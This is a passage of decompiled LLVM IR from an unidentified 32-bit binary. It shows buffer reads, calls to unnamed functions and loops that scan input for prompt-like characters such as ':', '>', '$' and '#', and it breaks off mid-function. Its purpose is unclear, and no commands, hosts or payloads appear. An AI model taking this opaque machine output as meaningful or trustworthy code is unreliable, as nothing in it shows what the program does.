dec_label_pc_804e68e:                             ; preds = %dec_label_pc_804e66a, %dec_label_pc_804e680
  %v0_804e68e = phi i32 [ %v1_804e679, %dec_label_pc_804e680 ], [ %v0_804e679, %dec_label_pc_804e66a ]
  %v1_804e68e = add i32 %v0_804e68e, 1
  store i32 %v1_804e68e, i32* @esi, align 4
  %v10_804e691 = icmp eq i32 %v0_804e68e, -2
  br i1 %v10_804e691, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e69a

dec_label_pc_804e69a:                             ; preds = %dec_label_pc_804e68e.thread, %dec_label_pc_804e68e
  %v1_804e68e176 = phi i32 [ %v3_804e650, %dec_label_pc_804e68e.thread ], [ %v1_804e68e, %dec_label_pc_804e68e ]
  %tmp136 = icmp slt i32 %v1_804e68e176, 1
  br i1 %tmp136, label %dec_label_pc_804ea99, label %dec_label_pc_804e6a2

dec_label_pc_804e6a2:                             ; preds = %dec_label_pc_804e69a
  %v0_804e6a2 = load i32, i32* @esp, align 4
  %v1_804e6a5 = add i32 %v0_804e6a2, -16
  %v2_804e6a5 = inttoptr i32 %v1_804e6a5 to i32*
  store i32 8, i32* %v2_804e6a5, align 4
  %v0_804e6a7 = call i32 @function_804f160()
  store i32 %v0_804e6a7, i32* %eax.global-to-local, align 4
  %v0_804e6ac = load i32, i32* @esp, align 4
  %v1_804e6ac = inttoptr i32 %v0_804e6ac to i32*
  %v2_804e6ac = load i32, i32* %v1_804e6ac, align 4
  store i32 %v2_804e6ac, i32* %eax.global-to-local, align 4
  %v3_804e6ac = add i32 %v0_804e6ac, 4
  %v1_804e6ad = inttoptr i32 %v3_804e6ac to i32*
  %v2_804e6ad = load i32, i32* %v1_804e6ad, align 4
  store i32 %v2_804e6ad, i32* %edx.global-to-local, align 4
  %v1_804e6ae = add i32 %v0_804e6ac, 1872
  store i32 %v1_804e6ae, i32* %eax.global-to-local, align 4
  store i32 %v1_804e6ae, i32* %v1_804e6ad, align 4
  store i32 8, i32* %v1_804e6ac, align 4
  %v0_804e6b8 = call i32 @function_804f0b0()
  store i32 %v0_804e6b8, i32* %eax.global-to-local, align 4
  %v0_804e6bd = load i32, i32* @esp, align 4
  %v1_804e6bd = add i32 %v0_804e6bd, -4
  %v2_804e6bd = inttoptr i32 %v1_804e6bd to i32*
  store i32 16384, i32* %v2_804e6bd, align 4
  %v1_804e6c2 = add i32 %v0_804e6bd, 1872
  %v2_804e6c2 = inttoptr i32 %v1_804e6c2 to i32*
  %v3_804e6c2 = load i32, i32* %v2_804e6c2, align 4
  %v2_804e6c9 = add i32 %v0_804e6bd, -8
  %v3_804e6c9 = inttoptr i32 %v2_804e6c9 to i32*
  store i32 %v3_804e6c2, i32* %v3_804e6c9, align 4
  %v2_804e6ca = add i32 %v0_804e6bd, -12
  %v3_804e6ca = inttoptr i32 %v2_804e6ca to i32*
  store i32 %v0_804e6b8, i32* %v3_804e6ca, align 4
  %v0_804e6cb = load i32, i32* @edi, align 4
  %v1_804e6cb = add i32 %v0_804e6cb, 4
  %v2_804e6cb = inttoptr i32 %v1_804e6cb to i32*
  %v3_804e6cb = load i32, i32* %v2_804e6cb, align 4
  store i32 %v3_804e6cb, i32* @ebx, align 4
  %v2_804e6ce = add i32 %v0_804e6bd, -16
  %v3_804e6ce = inttoptr i32 %v2_804e6ce to i32*
  store i32 %v3_804e6cb, i32* %v3_804e6ce, align 4
  %v0_804e6cf = call i32 @function_8050441()
  store i32 %v0_804e6cf, i32* %eax.global-to-local, align 4
  %v0_804e6d4 = load i32, i32* @esp, align 4
  %v1_804e6d7 = add i32 %v0_804e6d4, 28
  %v2_804e6d7 = inttoptr i32 %v1_804e6d7 to i32*
  store i32 16384, i32* %v2_804e6d7, align 4
  %v1_804e6dc = add i32 %v0_804e6d4, 24
  %v2_804e6dc = inttoptr i32 %v1_804e6dc to i32*
  store i32 2, i32* %v2_804e6dc, align 4
  %v1_804e6de = add i32 %v0_804e6d4, 20
  %v2_804e6de = inttoptr i32 %v1_804e6de to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804e6de, align 4
  %v0_804e6e3 = load i32, i32* @edi, align 4
  %v1_804e6e3 = add i32 %v0_804e6e3, 4
  %v2_804e6e3 = inttoptr i32 %v1_804e6e3 to i32*
  %v3_804e6e3 = load i32, i32* %v2_804e6e3, align 4
  store i32 %v3_804e6e3, i32* %ecx.global-to-local, align 4
  %v2_804e6e6 = add i32 %v0_804e6d4, 16
  %v3_804e6e6 = inttoptr i32 %v2_804e6e6 to i32*
  store i32 %v3_804e6e3, i32* %v3_804e6e6, align 4
  %v0_804e6e7 = call i32 @function_8050441()
  store i32 %v0_804e6e7, i32* %eax.global-to-local, align 4
  %v0_804e6ec = load i32, i32* @esp, align 4
  %v1_804e6ec = inttoptr i32 %v0_804e6ec to i32*
  store i32 8, i32* %v1_804e6ec, align 4
  %v0_804e6f3 = call i32 @function_804f0e0()
  store i32 %v0_804e6f3, i32* %eax.global-to-local, align 4
  %v0_804e6fb = load i32, i32* @edi, align 4
  %v1_804e6fb = add i32 %v0_804e6fb, 12
  %v2_804e6fb = inttoptr i32 %v1_804e6fb to i32*
  store i32 7, i32* %v2_804e6fb, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804e707:                             ; preds = %dec_label_pc_804e497
  %v0_804e707 = load i32, i32* @esp, align 4
  %v1_804e70a = add i32 %v0_804e707, -16
  %v2_804e70a = inttoptr i32 %v1_804e70a to i32*
  store i32 12, i32* %v2_804e70a, align 4
  %v0_804e70c = call i32 @function_804f160()
  store i32 %v0_804e70c, i32* %eax.global-to-local, align 4
  %v0_804e711 = load i32, i32* @esp, align 4
  %v1_804e711 = inttoptr i32 %v0_804e711 to i32*
  %v2_804e711 = load i32, i32* %v1_804e711, align 4
  store i32 %v2_804e711, i32* %eax.global-to-local, align 4
  %v3_804e711 = add i32 %v0_804e711, 4
  %v1_804e712 = inttoptr i32 %v3_804e711 to i32*
  %v2_804e712 = load i32, i32* %v1_804e712, align 4
  store i32 %v2_804e712, i32* %edx.global-to-local, align 4
  %v1_804e713 = add i32 %v0_804e711, 1864
  store i32 %v1_804e713, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e713, i32* %v1_804e712, align 4
  store i32 12, i32* %v1_804e711, align 4
  %v0_804e71d = call i32 @function_804f0b0()
  store i32 %v0_804e71d, i32* %eax.global-to-local, align 4
  %v0_804e722 = load i32, i32* @esp, align 4
  %v1_804e722 = add i32 %v0_804e722, 1864
  %v2_804e722 = inttoptr i32 %v1_804e722 to i32*
  %v3_804e722 = load i32, i32* %v2_804e722, align 4
  %v1_804e729 = add i32 %v3_804e722, -1
  store i32 %v1_804e729, i32* %edx.global-to-local, align 4
  %v2_804e72a = add i32 %v0_804e722, -4
  %v3_804e72a = inttoptr i32 %v2_804e72a to i32*
  store i32 %v1_804e729, i32* %v3_804e72a, align 4
  %v2_804e72b = add i32 %v0_804e722, -8
  %v3_804e72b = inttoptr i32 %v2_804e72b to i32*
  store i32 %v0_804e71d, i32* %v3_804e72b, align 4
  %v0_804e72c = load i32, i32* @edi, align 4
  %v1_804e72c = add i32 %v0_804e72c, 24
  %v2_804e72c = inttoptr i32 %v1_804e72c to i32*
  %v3_804e72c = load i32, i32* %v2_804e72c, align 4
  store i32 %v3_804e72c, i32* %eax.global-to-local, align 4
  %v2_804e72f = add i32 %v0_804e722, -12
  %v3_804e72f = inttoptr i32 %v2_804e72f to i32*
  store i32 %v3_804e72c, i32* %v3_804e72f, align 4
  %v1_804e730 = add i32 %v0_804e722, 24
  %v2_804e730 = inttoptr i32 %v1_804e730 to i32*
  %v3_804e730 = load i32, i32* %v2_804e730, align 4
  store i32 %v3_804e730, i32* %eax.global-to-local, align 4
  %v2_804e734 = add i32 %v0_804e722, -16
  %v3_804e734 = inttoptr i32 %v2_804e734 to i32*
  store i32 %v3_804e730, i32* %v3_804e734, align 4
  %v0_804e735 = call i32 @function_804f870()
  %v0_804e73a = load i32, i32* @esp, align 4
  %v1_804e73d = add i32 %v0_804e735, 1
  %v8_804e73d = icmp eq i32 %v1_804e73d, 0
  store i32 %v1_804e73d, i32* %eax.global-to-local, align 4
  %v1_804ec40 = add i32 %v0_804e73a, 16
  %v2_804ec40 = inttoptr i32 %v1_804ec40 to i32*
  store i32 12, i32* %v2_804ec40, align 4
  %v0_804ec42 = call i32 @function_804f0e0()
  store i32 %v0_804ec42, i32* %eax.global-to-local, align 4
  %v0_804ec47 = load i32, i32* @esp, align 4
  %v1_804ec47 = inttoptr i32 %v0_804ec47 to i32*
  br i1 %v8_804e73d, label %dec_label_pc_804ec3d, label %dec_label_pc_804e744

dec_label_pc_804e744:                             ; preds = %dec_label_pc_804e707
  %v2_804e74e = load i32, i32* %v1_804ec47, align 4
  store i32 %v2_804e74e, i32* %eax.global-to-local, align 4
  %v0_804e74f = load i32, i32* @edi, align 4
  %v1_804e74f = add i32 %v0_804e74f, 4
  %v2_804e74f = inttoptr i32 %v1_804e74f to i32*
  %v3_804e74f = load i32, i32* %v2_804e74f, align 4
  store i32 %v3_804e74f, i32* %eax.global-to-local, align 4
  store i32 %v3_804e74f, i32* %v1_804ec47, align 4
  %v1_804e753 = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e753, i32* %eax.global-to-local, align 4
  %v0_804e758 = load i32, i32* @edi, align 4
  %v1_804e758 = add i32 %v0_804e758, 284
  %v2_804e758 = inttoptr i32 %v1_804e758 to i8*
  %v3_804e758 = load i8, i8* %v2_804e758, align 1
  %v4_804e758 = zext i8 %v3_804e758 to i32
  %v6_804e758 = and i32 %v1_804e753, -256
  %v7_804e758 = or i32 %v4_804e758, %v6_804e758
  %v1_804e761 = add i32 %v7_804e758, 1
  store i32 %v1_804e761, i32* %eax.global-to-local, align 4
  %v1_804e762 = add i32 %v0_804e758, 4
  %v2_804e762 = inttoptr i32 %v1_804e762 to i32*
  store i32 -1, i32* %v2_804e762, align 4
  %v0_804e769 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e769 = trunc i32 %v0_804e769 to i8
  %v2_804e769 = load i32, i32* @edi, align 4
  %v3_804e769 = add i32 %v2_804e769, 284
  %v4_804e769 = inttoptr i32 %v3_804e769 to i8*
  store i8 %v1_804e769, i8* %v4_804e769, align 1
  %v0_804e76f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e76f = trunc i32 %v0_804e76f to i8
  %v10_804e76f = icmp eq i8 %v1_804e76f, 10
  %v1_804e771 = icmp eq i1 %v10_804e76f, false
  %v0_804effd = load i32, i32* @edi, align 4
  br i1 %v1_804e771, label %dec_label_pc_804effd, label %dec_label_pc_804e777

dec_label_pc_804e777:                             ; preds = %dec_label_pc_804e744
  %v1_804e777 = add i32 %v0_804effd, 284
  %v2_804e777 = inttoptr i32 %v1_804e777 to i8*
  store i8 0, i8* %v2_804e777, align 1
  %v0_804e77e = load i32, i32* @edi, align 4
  %v1_804e77e = add i32 %v0_804e77e, 12
  %v2_804e77e = inttoptr i32 %v1_804e77e to i32*
  store i32 0, i32* %v2_804e77e, align 4
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804e788:                             ; preds = %dec_label_pc_804ea99, %dec_label_pc_804e84a, %dec_label_pc_804ed81, %dec_label_pc_804effd, %dec_label_pc_804ecc0, %dec_label_pc_804e6a2, %dec_label_pc_804eab6, %dec_label_pc_804ed08, %dec_label_pc_804ea5b, %dec_label_pc_804e52e, %dec_label_pc_804ebe5, %dec_label_pc_804e777
  %v0_804e788 = load i32, i32* @edi, align 4
  %v1_804e788 = add i32 %v0_804e788, 24
  %v2_804e788 = inttoptr i32 %v1_804e788 to i32*
  %v3_804e788 = load i32, i32* %v2_804e788, align 4
  store i32 %v3_804e788, i32* %edx.global-to-local, align 4
  store i32 %v3_804e788, i32* %eax.global-to-local, align 4
  %v1_804e78d = load i32, i32* @esi, align 4
  %v2_804e78d = sub i32 %v3_804e788, %v1_804e78d
  %v8_804e78d = xor i32 %v1_804e78d, %v3_804e788
  %v9_804e78d = xor i32 %v2_804e78d, %v3_804e788
  %v10_804e78d = and i32 %v9_804e78d, %v8_804e78d
  %v11_804e78d = icmp slt i32 %v10_804e78d, 0
  %v12_804e78d = icmp eq i32 %v2_804e78d, 0
  %v13_804e78d = icmp slt i32 %v2_804e78d, 0
  %v3_804e78f = icmp ne i1 %v13_804e78d, %v11_804e78d
  %v4_804e78f = or i1 %v12_804e78d, %v3_804e78f
  br i1 %v4_804e78f, label %dec_label_pc_804e793, label %dec_label_pc_804e791

dec_label_pc_804e791:                             ; preds = %dec_label_pc_804e788
  store i32 %v1_804e78d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e788, %dec_label_pc_804e791
  %v1_804e793 = phi i32 [ %v3_804e788, %dec_label_pc_804e788 ], [ %v1_804e78d, %dec_label_pc_804e791 ]
  %v2_804e793 = sub i32 %v3_804e788, %v1_804e793
  store i32 %v2_804e793, i32* %eax.global-to-local, align 4
  store i32 %v2_804e793, i32* %v2_804e788, align 4
  %v0_804e798 = load i32, i32* @ebx, align 4
  %v1_804e798 = load i32, i32* @esp, align 4
  %v2_804e798 = add i32 %v1_804e798, -4
  %v3_804e798 = inttoptr i32 %v2_804e798 to i32*
  store i32 %v0_804e798, i32* %v3_804e798, align 4
  %v0_804e799 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e799 = add i32 %v1_804e798, -8
  %v3_804e799 = inttoptr i32 %v2_804e799 to i32*
  store i32 %v0_804e799, i32* %v3_804e799, align 4
  %v1_804e79a = add i32 %v1_804e798, 8
  %v2_804e79a = inttoptr i32 %v1_804e79a to i32*
  %v3_804e79a = load i32, i32* %v2_804e79a, align 4
  %v1_804e79e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e79e = add i32 %v1_804e79e, %v3_804e79a
  store i32 %v2_804e79e, i32* %eax.global-to-local, align 4
  %v2_804e7a0 = add i32 %v1_804e798, -12
  %v3_804e7a0 = inttoptr i32 %v2_804e7a0 to i32*
  store i32 %v2_804e79e, i32* %v3_804e7a0, align 4
  %v3_804e7a1 = load i32, i32* %v2_804e79a, align 4
  store i32 %v3_804e7a1, i32* %ecx.global-to-local, align 4
  %v2_804e7a5 = add i32 %v1_804e798, -16
  %v3_804e7a5 = inttoptr i32 %v2_804e7a5 to i32*
  store i32 %v3_804e7a1, i32* %v3_804e7a5, align 4
  %v4_804e7a6 = call i32 @function_8050245(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e7a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e497

dec_label_pc_804e7b3:                             ; preds = %dec_label_pc_804e497
  %v1_804e7b3 = add i32 %v0_804e497, 24
  %v2_804e7b3 = inttoptr i32 %v1_804e7b3 to i32*
  %v3_804e7b3 = load i32, i32* %v2_804e7b3, align 4
  %v1_804e7b6 = add i32 %v3_804e7b3, -1
  store i32 %v1_804e7b6, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v1_804e7b6, 1
  br i1 %tmp137, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e7bf.preheader

dec_label_pc_804e7bf.preheader:                   ; preds = %dec_label_pc_804e7b3
  %v7_804e7bf.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e7bf = add i32 %v0_804e497, 28
  br label %dec_label_pc_804e7bf

dec_label_pc_804e7bf:                             ; preds = %dec_label_pc_804e7bf.preheader, %dec_label_pc_804e7f0
  %v7_804e7bf = phi i32 [ %v7_804e7bf.pre, %dec_label_pc_804e7bf.preheader ], [ %v9_804e7bf, %dec_label_pc_804e7f0 ]
  %v0_804ed6d = phi i32 [ %v1_804e7b6, %dec_label_pc_804e7bf.preheader ], [ %v1_804e7f0, %dec_label_pc_804e7f0 ]
  %v3_804e7bf = add i32 %v2_804e7bf, %v0_804ed6d
  %v4_804e7bf = inttoptr i32 %v3_804e7bf to i8*
  %v5_804e7bf = load i8, i8* %v4_804e7bf, align 1
  %v6_804e7bf = zext i8 %v5_804e7bf to i32
  %v8_804e7bf = and i32 %v7_804e7bf, -256
  %v9_804e7bf = or i32 %v6_804e7bf, %v8_804e7bf
  store i32 %v9_804e7bf, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e7bf, label %dec_label_pc_804e7f0 [
    i8 58, label %dec_label_pc_804ed6d
    i8 62, label %dec_label_pc_804ed6d
    i8 36, label %dec_label_pc_804ed6d
    i8 35, label %dec_label_pc_804ed6d
    i8 37, label %dec_label_pc_804ed6d
  ]

dec_label_pc_804e7f0:                             ; preds = %dec_label_pc_804e7bf
  %v1_804e7f0 = add i32 %v0_804ed6d, -1
  %v8_804e7f0 = icmp eq i32 %v1_804e7f0, 0
  store i32 %v1_804e7f0, i32* %eax.global-to-local, align 4
  %v1_804e7f1 = icmp eq i1 %v8_804e7f0, false
  br i1 %v1_804e7f1, label %dec_label_pc_804e7bf, label %dec_label_pc_804e425.backedge

dec_label_pc_804e7f8:                             ; preds = %dec_label_pc_804e497
  %v1_804e7f8 = add i32 %v0_804e497, 24
  %v2_804e7f8 = inttoptr i32 %v1_804e7f8 to i32*
  %v3_804e7f8 = load i32, i32* %v2_804e7f8, align 4
  %v1_804e7fb = add i32 %v3_804e7f8, -1
  store i32 %v1_804e7fb, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v1_804e7fb, 1
  br i1 %tmp138, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e804

dec_label_pc_804e804:                             ; preds = %dec_label_pc_804e7f8
  %v2_804e804 = add i32 %v0_804e497, 27
  %v3_804e804 = add i32 %v2_804e804, %v3_804e7f8
  %v4_804e804 = inttoptr i32 %v3_804e804 to i8*
  %v5_804e804 = load i8, i8* %v4_804e804, align 1
  %v6_804e804 = zext i8 %v5_804e804 to i32
  %v7_804e804 = load i32, i32* %edx.global-to-local, align 4
  %v8_804e804 = and i32 %v7_804e804, -256
  %v9_804e804 = or i32 %v8_804e804, %v6_804e804
  store i32 %v9_804e804, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e804, label %dec_label_pc_804e812 [
    i8 62, label %dec_label_pc_804e836.thread
    i8 58, label %dec_label_pc_804e836.thread
  ]

dec_label_pc_804e812:                             ; preds = %dec_label_pc_804e804, %dec_label_pc_804e828
  %v0_804e821 = phi i32 [ %v1_804e821, %dec_label_pc_804e828 ], [ %v1_804e7fb, %dec_label_pc_804e804 ]
  %v7_804e828 = phi i32 [ %v9_804e828, %dec_label_pc_804e828 ], [ %v9_804e804, %dec_label_pc_804e804 ]
  %v1_804e812 = trunc i32 %v7_804e828 to i8
  %v1_804e812.off = add i8 %v1_804e812, -35
  %switch168 = icmp ult i8 %v1_804e812.off, 3
  br i1 %switch168, label %dec_label_pc_804e836, label %dec_label_pc_804e821

dec_label_pc_804e821:                             ; preds = %dec_label_pc_804e812
  %v1_804e821 = add i32 %v0_804e821, -1
  %v8_804e821 = icmp eq i32 %v1_804e821, 0
  store i32 %v1_804e821, i32* %eax.global-to-local, align 4
  br i1 %v8_804e821, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e828

dec_label_pc_804e828:                             ; preds = %dec_label_pc_804e821
  %v3_804e828 = add i32 %v2_804e804, %v0_804e821
  %v4_804e828 = inttoptr i32 %v3_804e828 to i8*
  %v5_804e828 = load i8, i8* %v4_804e828, align 1
  %v6_804e828 = zext i8 %v5_804e828 to i32
  %v8_804e828 = and i32 %v7_804e828, -256
  %v9_804e828 = or i32 %v6_804e828, %v8_804e828
  store i32 %v9_804e828, i32* %edx.global-to-local, align 4
  %v10_804e82c = icmp ne i8 %v5_804e828, 58
  %v10_804e831 = icmp eq i8 %v5_804e828, 62
  %v1_804e834 = icmp eq i1 %v10_804e831, false
  %or.cond166 = and i1 %v10_804e82c, %v1_804e834
  br i1 %or.cond166, label %dec_label_pc_804e812, label %dec_label_pc_804e836

dec_label_pc_804e836.thread:                      ; preds = %dec_label_pc_804e804, %dec_label_pc_804e804
  store i32 %v3_804e7f8, i32* @esi, align 4
  br label %dec_label_pc_804e842

dec_label_pc_804e836:                             ; preds = %dec_label_pc_804e812, %dec_label_pc_804e828
  %v0_804e836 = phi i32 [ %v1_804e821, %dec_label_pc_804e828 ], [ %v0_804e821, %dec_label_pc_804e812 ]
  %v1_804e836 = add i32 %v0_804e836, 1
  store i32 %v1_804e836, i32* @esi, align 4
  %v10_804e839 = icmp eq i32 %v0_804e836, -2
  br i1 %v10_804e839, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e842

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e836.thread, %dec_label_pc_804e836
  %v1_804e836179 = phi i32 [ %v3_804e7f8, %dec_label_pc_804e836.thread ], [ %v1_804e836, %dec_label_pc_804e836 ]
  %tmp139 = icmp slt i32 %v1_804e836179, 1
  br i1 %tmp139, label %dec_label_pc_804ea99, label %dec_label_pc_804e84a

dec_label_pc_804e84a:                             ; preds = %dec_label_pc_804e842
  %v0_804e84a = load i32, i32* @esp, align 4
  %v1_804e84d = add i32 %v0_804e84a, -16
  %v2_804e84d = inttoptr i32 %v1_804e84d to i32*
  store i32 10, i32* %v2_804e84d, align 4
  %v0_804e84f = call i32 @function_804f160()
  store i32 %v0_804e84f, i32* %eax.global-to-local, align 4
  %v0_804e854 = load i32, i32* @esp, align 4
  %v1_804e854 = inttoptr i32 %v0_804e854 to i32*
  %v2_804e854 = load i32, i32* %v1_804e854, align 4
  store i32 %v2_804e854, i32* %eax.global-to-local, align 4
  %v3_804e854 = add i32 %v0_804e854, 4
  %v1_804e855 = inttoptr i32 %v3_804e854 to i32*
  %v1_804e856 = add i32 %v0_804e854, 1864
  store i32 %v1_804e856, i32* %edx.global-to-local, align 4
  store i32 %v1_804e856, i32* %v1_804e855, align 4
  store i32 10, i32* %v1_804e854, align 4
  %v0_804e860 = call i32 @function_804f0b0()
  store i32 %v0_804e860, i32* %eax.global-to-local, align 4
  %v0_804e865 = load i32, i32* @esp, align 4
  %v1_804e865 = add i32 %v0_804e865, -4
  %v2_804e865 = inttoptr i32 %v1_804e865 to i32*
  store i32 16384, i32* %v2_804e865, align 4
  %v1_804e86a = add i32 %v0_804e865, 1864
  %v2_804e86a = inttoptr i32 %v1_804e86a to i32*
  %v3_804e86a = load i32, i32* %v2_804e86a, align 4
  %v2_804e871 = add i32 %v0_804e865, -8
  %v3_804e871 = inttoptr i32 %v2_804e871 to i32*
  store i32 %v3_804e86a, i32* %v3_804e871, align 4
  %v2_804e872 = add i32 %v0_804e865, -12
  %v3_804e872 = inttoptr i32 %v2_804e872 to i32*
  store i32 %v0_804e860, i32* %v3_804e872, align 4
  %v0_804e873 = load i32, i32* @edi, align 4
  %v1_804e873 = add i32 %v0_804e873, 4
  %v2_804e873 = inttoptr i32 %v1_804e873 to i32*
  %v3_804e873 = load i32, i32* %v2_804e873, align 4
  store i32 %v3_804e873, i32* @ebx, align 4
  %v2_804e876 = add i32 %v0_804e865, -16
  %v3_804e876 = inttoptr i32 %v2_804e876 to i32*
  store i32 %v3_804e873, i32* %v3_804e876, align 4
  %v0_804e877 = call i32 @function_8050441()
  store i32 %v0_804e877, i32* %eax.global-to-local, align 4
  %v0_804e87c = load i32, i32* @esp, align 4
  %v1_804e87f = add i32 %v0_804e87c, 28
  %v2_804e87f = inttoptr i32 %v1_804e87f to i32*
  store i32 16384, i32* %v2_804e87f, align 4
  %v1_804e884 = add i32 %v0_804e87c, 24
  %v2_804e884 = inttoptr i32 %v1_804e884 to i32*
  store i32 2, i32* %v2_804e884, align 4
  %v1_804e886 = add i32 %v0_804e87c, 20
  %v2_804e886 = inttoptr i32 %v1_804e886 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804e886, align 4
  %v0_804e88b = load i32, i32* @edi, align 4
  %v1_804e88b = add i32 %v0_804e88b, 4
  %v2_804e88b = inttoptr i32 %v1_804e88b to i32*
  %v3_804e88b = load i32, i32* %v2_804e88b, align 4
  store i32 %v3_804e88b, i32* %ecx.global-to-local, align 4
  %v2_804e88e = add i32 %v0_804e87c, 16
  %v3_804e88e = inttoptr i32 %v2_804e88e to i32*
  store i32 %v3_804e88b, i32* %v3_804e88e, align 4
  %v0_804e88f = call i32 @function_8050441()
  store i32 %v0_804e88f, i32* %eax.global-to-local, align 4
  %v0_804e894 = load i32, i32* @esp, align 4
  %v1_804e894 = inttoptr i32 %v0_804e894 to i32*
  store i32 10, i32* %v1_804e894, align 4
  %v0_804e89b = call i32 @function_804f0e0()
  store i32 %v0_804e89b, i32* %eax.global-to-local, align 4
  %v0_804e8a3 = load i32, i32* @edi, align 4
  %v1_804e8a3 = add i32 %v0_804e8a3, 12
  %v2_804e8a3 = inttoptr i32 %v1_804e8a3 to i32*
  store i32 10, i32* %v2_804e8a3, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804e8af:                             ; preds = %dec_label_pc_804e4c6
  %v1_804e8af = add i32 %v0_804e4b4, 2
  store i32 %v1_804e8af, i32* @ebx, align 4
  %v1_804e8b2 = add i32 %v0_804e8b2, 2
  store i32 %v1_804e8b2, i32* @esi, align 4
  br label %dec_label_pc_804e4b0.backedge

dec_label_pc_804e4b0.backedge:                    ; preds = %dec_label_pc_804e8af, %dec_label_pc_804efaa
  %v0_804e52e120 = phi i32 [ %v0_804e52e121, %dec_label_pc_804e8af ], [ %v0_804efe3, %dec_label_pc_804efaa ]
  %v1_804e4b0 = phi i32 [ %v1_804e4c0, %dec_label_pc_804e8af ], [ %v3_804efe3, %dec_label_pc_804efaa ]
  %v0_804e4b0 = phi i32 [ %v1_804e8b2, %dec_label_pc_804e8af ], [ %v0_804e4b0.pre, %dec_label_pc_804efaa ]
  %v5_804e4c6109 = phi i32 [ %v7_804e4c6, %dec_label_pc_804e8af ], [ %v0_804efdb, %dec_label_pc_804efaa ]
  %v0_804e4b9104 = phi i32 [ %v0_804e928, %dec_label_pc_804e8af ], [ %v1_804efe0, %dec_label_pc_804efaa ]
  %v2_804e4b0 = sub i32 %v0_804e4b0, %v1_804e4b0
  %v8_804e4b0 = xor i32 %v0_804e4b0, %v1_804e4b0
  %v9_804e4b0 = xor i32 %v2_804e4b0, %v0_804e4b0
  %v10_804e4b0 = and i32 %v9_804e4b0, %v8_804e4b0
  %v11_804e4b0 = icmp slt i32 %v10_804e4b0, 0
  %v13_804e4b0 = icmp slt i32 %v2_804e4b0, 0
  %v2_804e4b2 = icmp eq i1 %v13_804e4b0, %v11_804e4b0
  br i1 %v2_804e4b2, label %dec_label_pc_804e526, label %dec_label_pc_804e4b4.preheader

dec_label_pc_804e8ba:                             ; preds = %dec_label_pc_804e4f2
  store i8 -4, i8* %v2_804e4f2, align 1
  br label %dec_label_pc_804e505

dec_label_pc_804e8c3:                             ; preds = %dec_label_pc_804e440
  %v1_804e46d = icmp eq i32 %v0_804e465, 0
  br i1 %v1_804e46d, label %dec_label_pc_804ef7f, label %dec_label_pc_804e8c9

dec_label_pc_804e8c9:                             ; preds = %dec_label_pc_804e8c3
  %v10_804e8c9 = icmp eq i32 %v0_804e465, -1
  %v1_804e8cc = icmp eq i1 %v10_804e8c9, false
  br i1 %v1_804e8cc, label %dec_label_pc_804e487, label %dec_label_pc_804e8d2

dec_label_pc_804e8d2:                             ; preds = %dec_label_pc_804e8c9
  %v1_804e8d2 = add i32 %v0_804e46a, 40
  %v2_804e8d2 = inttoptr i32 %v1_804e8d2 to i32*
  %v3_804e8d2 = load i32, i32* %v2_804e8d2, align 4
  store i32 %v3_804e8d2, i32* %edx.global-to-local, align 4
  %v1_804e8d6 = inttoptr i32 %v3_804e8d2 to i32*
  %v2_804e8d6 = load i32, i32* %v1_804e8d6, align 4
  %v11_804e8d6 = icmp eq i32 %v2_804e8d6, 11
  br i1 %v11_804e8d6, label %dec_label_pc_804e3c2, label %dec_label_pc_804e8df

dec_label_pc_804e8df:                             ; preds = %dec_label_pc_804e8d2, %dec_label_pc_804ef7f
  %v0_804e8df = phi i32 [ %v1_804e46a, %dec_label_pc_804e8d2 ], [ %v0_804e8df.pre, %dec_label_pc_804ef7f ]
  %v0_804e8e2 = load i32, i32* @edi, align 4
  %v1_804e8e2 = add i32 %v0_804e8e2, 4
  %v2_804e8e2 = inttoptr i32 %v1_804e8e2 to i32*
  %v3_804e8e2 = load i32, i32* %v2_804e8e2, align 4
  store i32 %v3_804e8e2, i32* %ecx.global-to-local, align 4
  %v2_804e8e5 = add i32 %v0_804e8df, -16
  %v3_804e8e5 = inttoptr i32 %v2_804e8e5 to i32*
  store i32 %v3_804e8e2, i32* %v3_804e8e5, align 4
  %v1_804e8e6 = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e8e6, i32* %eax.global-to-local, align 4
  %v0_804e8eb = load i32, i32* @edi, align 4
  %v1_804e8eb = add i32 %v0_804e8eb, 284
  %v2_804e8eb = inttoptr i32 %v1_804e8eb to i8*
  %v3_804e8eb = load i8, i8* %v2_804e8eb, align 1
  %v4_804e8eb = zext i8 %v3_804e8eb to i32
  %v6_804e8eb = and i32 %v1_804e8e6, -256
  %v7_804e8eb = or i32 %v4_804e8eb, %v6_804e8eb
  %v1_804e8f4 = add i32 %v7_804e8eb, 1
  store i32 %v1_804e8f4, i32* %eax.global-to-local, align 4
  %v1_804e8f5 = add i32 %v0_804e8eb, 4
  %v2_804e8f5 = inttoptr i32 %v1_804e8f5 to i32*
  store i32 -1, i32* %v2_804e8f5, align 4
  %v0_804e8fc = load i32, i32* %eax.global-to-local, align 4
